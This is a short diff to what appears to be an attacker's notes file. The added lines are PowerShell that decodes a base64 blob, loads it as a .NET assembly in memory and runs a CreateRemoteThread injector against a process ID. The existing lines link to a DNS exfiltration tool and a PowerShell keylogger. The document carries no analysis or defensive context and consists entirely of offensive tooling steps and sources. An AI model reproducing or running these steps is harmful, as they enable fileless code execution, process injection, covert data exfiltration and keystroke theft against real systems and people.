@@ -1,3 +1,11 @@
+$base = gc -raw .\remote.txt
+$b64 = [System.Convert]::FromBase64String($base)
+[System.Reflection.Assembly]::Load($b64)
+[CreateRemoteThread.Program]::Main(@())
+[CreateRemoteThread.Program]::Main(@(8812))
+
+==============================================================================================================================
+
 https://github.com/Arno0x/DNSExfiltrator/raw/refs/heads/master/release/dnsExfiltrator.exe
 
 https://raw.githubusercontent.com/lazywinadmin/PowerShell/refs/heads/master/TOOL-Start-KeyLogger/Start-KeyLogger.ps1
